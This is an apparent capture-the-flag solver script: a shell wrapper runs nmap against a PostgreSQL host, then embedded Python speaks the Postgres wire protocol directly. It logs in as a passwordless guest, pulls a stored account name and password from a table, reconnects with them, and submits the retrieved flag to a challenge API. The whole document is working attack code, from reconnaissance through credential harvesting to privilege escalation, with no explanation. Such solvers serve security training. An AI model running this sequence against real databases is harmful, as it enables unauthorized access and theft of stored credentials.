#!/bin/sh
set -eu

nmap -sV -p 5432 172.20.0.141
BODY="$(python3 - <<'PY'
import hashlib
import json
import socket
import struct
import urllib.request

HOST = "172.20.0.141"
PORT = 5432

def exact(sock, size):
    chunks = bytearray()
    while len(chunks) < size:
        part = sock.recv(size - len(chunks))
        if not part:
            raise RuntimeError("database closed the connection")
        chunks.extend(part)
    return bytes(chunks)

def packet(sock):
    kind = exact(sock, 1)
    size = struct.unpack("!I", exact(sock, 4))[0]
    return kind, exact(sock, size - 4)

def send_message(sock, kind, payload):
    sock.sendall(kind + struct.pack("!I", len(payload) + 4) + payload)

def connect(user, password=None):
    sock = socket.create_connection((HOST, PORT), timeout=5)
    params = (b"user\0" + user.encode() + b"\0database\0pastevault\0client_encoding\0UTF8\0\0")
    sock.sendall(struct.pack("!I", len(params) + 8) + struct.pack("!I", 196608) + params)
    while True:
        kind, payload = packet(sock)
        if kind == b"R":
            code = struct.unpack("!I", payload[:4])[0]
            if code == 0 or code == 3:
                continue
            if code == 5 and password is not None:
                salt = payload[4:8]
                inner = hashlib.md5((password + user).encode()).hexdigest().encode()
                response = b"md5" + hashlib.md5(inner + salt).hexdigest().encode()
                send_message(sock, b"p", response + b"\0")
                continue
            raise RuntimeError("unsupported database authentication request")
        if kind == b"E":
            raise RuntimeError("database rejected the connection")
        if kind == b"Z":
            return sock

def query(sock, sql):
    send_message(sock, b"Q", sql.encode() + b"\0")
    rows = []
    while True:
        kind, payload = packet(sock)
        if kind == b"D":
            count = struct.unpack("!H", payload[:2])[0]
            offset = 2
            row = []
            for _ in range(count):
                size = struct.unpack("!i", payload[offset:offset + 4])[0]
                offset += 4
                row.append(None if size == -1 else payload[offset:offset + size].decode())
                if size != -1:
                    offset += size
            rows.append(row)
        elif kind == b"E":
            raise RuntimeError("query failed")
        elif kind == b"Z":
            return rows

sock = connect("relay_guest")
credentials = query(sock, "SELECT account_name, account_password FROM public.access_notes")[0]
sock.close()
sock = connect(credentials[0], credentials[1])
flag = query(sock, "SELECT flag FROM public.protected_dispatch")[0][0]
sock.close()
print(json.dumps({"challenge_id": "scl-challenge-frame-fc7edb", "task_id": "task1", "flag": flag}, separators=(",", ":")))
PY
)"
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "$BODY"
